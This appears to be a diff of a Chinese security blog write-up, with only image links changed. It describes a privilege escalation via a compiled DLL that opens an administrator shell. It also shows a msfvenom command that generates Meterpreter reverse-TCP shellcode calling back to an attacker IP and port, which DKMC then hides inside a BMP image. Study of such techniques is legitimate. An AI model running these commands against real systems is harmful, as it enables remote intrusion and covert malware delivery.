@@ -21,17 +21,15 @@ https://xz.aliyun.com/t/3095
 
 这里的文件编译号生成为dll文件
 
-![2.png](https://www.t00ls.net/attachment.php?aid=NzEzMzN8YjVlN2RjNDV8MTU0NDcxMDEwOXwzYzkzOXM1c1AwMnpOQURVUVBXcm1JTy9RN2lCaTFSOUEvL0IydElsTGFyZUIvaw%3D%3D&noupdate=yes)
+![](https://ws1.sinaimg.cn/large/b6de3d7dly1fyehrf4diqj211z09oq5i.jpg)
 
-![3.png](https://www.t00ls.net/attachment.php?aid=NzEzMzR8ZWE2ZTRjOGR8MTU0NDcxMDEwOXwzYzkzOXM1c1AwMnpOQURVUVBXcm1JTy9RN2lCaTFSOUEvL0IydElsTGFyZUIvaw%3D%3D&noupdate=yes)
+![](https://ws1.sinaimg.cn/large/b6de3d7dly1fyehvgal9qj20z10eejt9.jpg)
 
 执行即可弹出administrator的命令行
 
 另附自动化脚本放在附件里
 
-![1.png](https://www.t00ls.net/attachment.php?aid=NzEzMzV8NTE4ZGZmMjF8MTU0NDcxMDEwOXwzYzkzOXM1c1AwMnpOQURVUVBXcm1JTy9RN2lCaTFSOUEvL0IydElsTGFyZUIvaw%3D%3D&noupdate=yes)
-
- 
+![](https://ws1.sinaimg.cn/large/b6de3d7dly1fyehvqrnfsj211y0kb43g.jpg)
 
 这里看到与表哥复现
 
@@ -62,11 +60,11 @@ https://xz.aliyun.com/t/3095
 生成shellcode
 kali ip： 192.168.0.107
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.107 LPORT=9999 -f raw  > /opt/shellcode
-![4.png](https://www.t00ls.net/attachment.php?aid=NzEzMzZ8MDkyY2ZjNDV8MTU0NDcxMDEwOXwzYzkzOXM1c1AwMnpOQURVUVBXcm1JTy9RN2lCaTFSOUEvL0IydElsTGFyZUIvaw%3D%3D&noupdate=yes) 
+![](https://ws1.sinaimg.cn/large/b6de3d7dly1fyehvz10mtj20iv0jv40n.jpg)
 DKMC生成shellcode
-![5.png](https://www.t00ls.net/attachment.php?aid=NzEzMzd8ZGIwNzUyMWJ8MTU0NDcxMDEwOXwzYzkzOXM1c1AwMnpOQURVUVBXcm1JTy9RN2lCaTFSOUEvL0IydElsTGFyZUIvaw%3D%3D&noupdate=yes) 
-![6.png](https://www.t00ls.net/attachment.php?aid=NzEzMzl8YzdmYjdhMTh8MTU0NDcxMDEwOXwzYzkzOXM1c1AwMnpOQURVUVBXcm1JTy9RN2lCaTFSOUEvL0IydElsTGFyZUIvaw%3D%3D&noupdate=yes) 
-![7.png](https://www.t00ls.net/attachment.php?aid=NzEzNDB8MWQzNzFjNDN8MTU0NDcxMDEwOXwzYzkzOXM1c1AwMnpOQURVUVBXcm1JTy9RN2lCaTFSOUEvL0IydElsTGFyZUIvaw%3D%3D&noupdate=yes) 
-![8.png](https://www.t00ls.net/attachment.php?aid=NzEzNDF8OGU5NTI5M2R8MTU0NDcxMDEwOXwzYzkzOXM1c1AwMnpOQURVUVBXcm1JTy9RN2lCaTFSOUEvL0IydElsTGFyZUIvaw%3D%3D&noupdate=yes) 
-![9.png](https://www.t00ls.net/attachment.php?aid=NzEzNDJ8YjAzNWVmOTh8MTU0NDcxMDEwOXwzYzkzOXM1c1AwMnpOQURVUVBXcm1JTy9RN2lCaTFSOUEvL0IydElsTGFyZUIvaw%3D%3D&noupdate=yes) 
+![](https://ws1.sinaimg.cn/large/b6de3d7dly1fyehw5aawkj20j00jp76v.jpg)
+![](https://ws1.sinaimg.cn/large/b6de3d7dly1fyehwb3qxvj20jc0kfacq.jpg)
+![](https://ws1.sinaimg.cn/large/b6de3d7dly1fyehwg1wxij20iw05i74x.jpg)
+![](https://ws1.sinaimg.cn/large/b6de3d7dly1fyehwk95jjj20jc0kfn01.jpg)
+![](https://ws1.sinaimg.cn/large/b6de3d7dly1fyehwohiwyj20jc0kfq6b.jpg)
 这个之前尝试是可以弹shell的，今天不知道为啥不行.....我改天再试试看，原理就是把shellcode放入bmp文件中	
